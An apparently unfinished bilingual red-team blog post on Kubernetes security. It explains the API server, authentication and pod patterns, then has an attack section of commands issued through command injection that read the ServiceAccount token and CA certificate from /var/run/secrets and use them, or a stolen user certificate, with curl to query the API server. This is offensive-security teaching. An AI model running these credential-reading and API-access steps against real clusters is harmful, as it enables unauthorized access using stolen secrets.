---
title: "[K8S] Security"
# author: wrkholic84
date: 2024-02-08 00:06:00 +0900
categories: [Development, Kubernetes]
tags: [kubernetes, security]
math: true
mermaid: true
# image:
#   path: /commons/devices-mockup.png
#   width: 800
#   height: 500
#   alt: Responsive rendering of Chirpy theme on multiple devices.
---

# Kubernetes for RedTeam
Kubernetes에 대한 경험과 이해가 다르고,
보안 취약점 점검 시 관련 내용에 대한 접근이 어려운 이유로,
kubernetes 취약점 발견과 연구를 충분히 수행하기에 어려움이 있음  
이를 위해, 다음 과정을 통해 kubernetes에 대한 정리와 점검 방법에 대한 평준화를 이루고자 함

Differences in experience and understanding of Kubernetes, along with difficulties in addressing related content during security vulnerability assessments, pose challenges in adequately conducting discovery and research of Kubernetes vulnerabilities.  
To address this, the aim is to achieve a standardization of organization and inspection methods for Kubernetes through the following process.

## Prerequisite Knowledge (Introduction - What we don't know)
### 1. Abstract Concept
![00](/assets/images/posts/20221226Security/00.png)
일반적으로 Kubernets 환경에 구축된 서비스는 위 그림과 같이 Apiserver와 Service 두 개의 접근 경로를 가짐.  
- Apiserver는 kubernetes 환경 전체를 제어
- Service(kuberntes resource)는 웹서비스를 인터넷과 연결해주는 역할 및 파드간 통신에 사용

우리의 목표는 이 두 가지 경로를 통해 취약점을 찾고, 안전한 서비스를 만드는 것.

Typically, Application deployed in a Kubernetes environment have two access points, as shown in the figure above: the Apiserver and the Service.

- Apiserver controls the entire Kubernetes environment.
- Service (a Kubernetes resource) connects the web service to the internet as NodePort or LoadBalancer or between pods.

Our goal is to get vulnerabilities and make services secure through these two pathways.

### 2. ApiServer
**Apiserver**는 kubernetes 자체라고 봐도 무방함. api를 호출하는 방식으로 권한에 따라 kubernetes 전체 환경을 제어할 수 있음. 성공적인 api 호출은 인증 > 권한 > Admission Control 3단계를 모두 통과해야 함.

- Admission Control : 리소스 사용 제한 등  

인증 정보(사용자, 서비스)에 권한(역할)이 부여되는 구조로, 인증 정보를 얻으면 인증에 해당하는 권한을 행사할 수 있음. 권한 및 Admission Control 관리를 위한 별도의 권한(관리자)이 필요.  

따라서 우리가 접근하여 활용할 수 있는 부분은 **인증**에 한정됨. 

Kubernetes의 인증은 다른 시스템과 마찬가지로 **사용자**와 **서비스**로 나뉨. 이 두 가지 중 한 가지로 Apiserver를 호출 할 수 있음. 

- 사용자 인증 정보는 운영 환경이나 서비스 환경에 인증서 형태로 존재.  
- 서비스는 애플리케이션(컨테이너) 내 토큰 형태로 존재.

둘 중 하나의 정보를 얻기 위해 노력해야 함.

**Apiserver** can essentially be considered as Kubernetes itself. It allows for the control of the entire Kubernetes environment through API calls, based on the permissions granted.  
For an API call to be successful, it must pass through three stages: authentication, authorization, and Admission Control.

- Admission Control: Restrictions on resource usage, etc.

The structure grants permissions (roles) to authentication information (users, services), and obtaining authentication information enables the exercise of corresponding permissions.  
Separate permissions (administrator) are required for the management of authorization and Admission Control. Therefore, our accessible and utilizable scope is limited to **authentication**.

Like other systems, authentication in Kubernetes is divided into users and services. Either of these can be used to call the Apiserver.

- UserAccount exists in the form of certificates in operational or service environments.
- ServiceAccount exist as tokens within applications (containers).

we need to obtain one of these pieces of information.

### 3. Pod Design Pattern
Pod는 Kubernetes에 의해 관리되는 애플리케이션의 최소 단위이며, 여러 컨테이너들의 집합.  
다음과 같은 패턴을 가짐.
![01](/assets/images/posts/20221226Security/01.png)
굳이 패턴 이야기를 하는 이유는 우리가 Command Injection이나 SSRF등의 애플리케이션 취약점을 이용해 접근할 수 있는 자원에 대한 이해를 높이기 위함임.

- Sidecar : Metric, Log 등을 위한 용도로 많이 쓰임. Istio가 대표적. 파일 시스템을 공유하고 있는 부분이 공략 포인트.
- Adapter : 애플리케이션의 출력 포멧을 통일 시키는 용도로 쓰임. 몰라도 됨.
- Ambassador : localhost를 목적지로 통신하는 애플리케이션을 쉽게 배포할 때 쓰임. 예를 들어, 애플리케이션이 localhost:3306(MySQL)과 통신한다면, Ambassador 컨테이너는 이 요청을 받아 필요한 목적지로 연결해줌. SSRF 시 고려해볼 수 있음.

A Pod is the smallest deployable unit of an application managed by Kubernetes, consisting of a collection of containers. It follows patterns like the one shown in the image. The reason for discussing patterns is to enhance our understanding of the resources we can access using application vulnerabilities like Command Injection or Server-Side Request Forgery (SSRF).

- Sidecar: Commonly used for metrics, logs, etc. Istio is a prime example. The point of attack is the shared file system.
- Adapter: Used to standardize the output format of applications. Not essential to know.
- Ambassador: Used for easily deploying applications that communicate with localhost as the destination. For example, if an application communicates with localhost:3306 (MySQL), the Ambassador container receives this request and connects it to the required destination. Considerable in the case of SSRF.

### 4. Container
Pod 안에 정의되며, 다양한 자원들을 정의하여 사용 가능.
ServiceAccount
Secret
ConfigMap
Volume

## Attack
### 1. Call ApiServer
Apiserver에 접근할 수 있는 경로는 두 가지임. 인터넷 또는 Data Plane. 호출 가능한 곳에서 호출하면 되고, 아래 설명은 한 가지씩 나누어 호출해보는 것으로 설명.
#### 1.1. with User Certificate (from Internet)
취약점 등을 통해 사용자 인증서와 키를 얻었다면 apiserver를 호출 할 수 있음
```bash
ubuntu@mypc:~$ curl -k --cert ./user.crt --key ./user.key https:/kubernetes:6443/api
{
  "kind": "APIVersions",
  "versions": [
    "v1"
  ],
  "serverAddressByClientCIDRs": [
    {
      "clientCIDR": "0.0.0.0/0",
      "serverAddress": "x.x.x.x:6443"
    }
  ]
}
```
사용자 인증서와 키는 base64로 인코딩되어 있을 수도 있음
```bash
ubuntu@mypc:~$ cat ./user.crt | base64 | tr -d "\n" 
LS0tLS1C...
ubuntu@mypc:~$ cat "LS0tLS1C..." | base64 -d
-----BEGIN CERTIFICATE-----
MIIDTzCCAjegAwIBAgIQYPmmYnZ...
-----END CERTIFICATE-----
```
#### 1.2. with ServiceAccount Token (in Containers)
Command Injection 등을 통해 컨테이너 내부에 명령 실행을 할 수 있다면,
#### get Kubernetes Information from env
```bash
Command Injection : env | grep -i kubernetes
KUBERNETES_PORT_443_TCP_PORT=443
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_PORT=tcp://10.96.0.1:443
KUBERNETES_SERVICE_HOST=10.96.0.1
KUBERNETES_SERVICE_PORT=443
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
KUBERNETES_PORT_443_TCP_PROTO=tcp
```
#### get Kubernetes Information from nslookup
```bash
Command Injection : nslookup kubernetes.default.svc
Server:		10.96.0.10
Address:	10.96.0.10#53

Name:	kubernetes.default.svc.cluster.local
Address: 10.96.0.1
```
#### get Kubernetes Information from ServiceAccount
```bash
Command Injection : cat /var/run/secrets/kubernetes.io/serviceaccount/token
eyJhbGciOiJSUz ...
Command Injection : cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
hack8s
Command Injection : cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
-----BEGIN CERTIFICATE-----
MIIDB ...
```
안되는 명령들이 있을 수 있지만, token만 확인이 된다면, 아래 명령을 통해 apiserver를 호출해 볼 수 있음.
```bash
Command Injection : cat /var/run/secrets/kubernetes.io/serviceaccount/token
eyJhbGciOiJSUzI...
Command Injection : curl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt --header "Authorization: Bearer eyJhbGciOiJSUzI..." -X GET https://kubernetes:6443/api/v1/namespaces/hack8s/pods
{
  "kind": "PodList",
  "apiVersion": "v1",
  "metadata": {
    "resourceVersion": "266526"
  },
  "items": [
    {
      "metadata": {
        "name": "busybox",
        ...
      }
    }
  ]
}
```

### SSRF
### 3. Service




